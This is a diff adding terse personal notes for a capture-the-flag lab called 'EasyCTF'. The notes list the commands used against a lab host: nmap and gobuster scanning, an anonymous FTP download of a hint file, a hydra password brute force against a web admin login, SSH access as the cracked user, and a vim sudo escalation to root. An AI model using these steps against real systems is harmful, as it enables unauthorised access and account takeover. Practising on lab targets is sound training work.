@@ -1,0 +1,19 @@
+EasyCTF
+
+
+sudo nmap -sC -sV -T4 10.10.121.111 
+
+gobuster dir -u http://10.10.121.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -x php,sh,txt,cgi,html,js,css,py -o scans/gobuster-small.txt
+
+ftp anonymous@10.10.121.111
+ftp> get ForMitch.txt
+cat ForMitch.txt         
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+
+hydra -l mitch -P ~/rockyou.txt 10.10.121.111 -v http-form-post "/simple/admin/login.php:username=mitch&password=^PASS^&loginsubmit=Submit:User name or password incorrect" 
+
+ssh -p 2222 mitch@10.10.121.111 
+
+sudo -l
+(gtfobins vim for root)
+
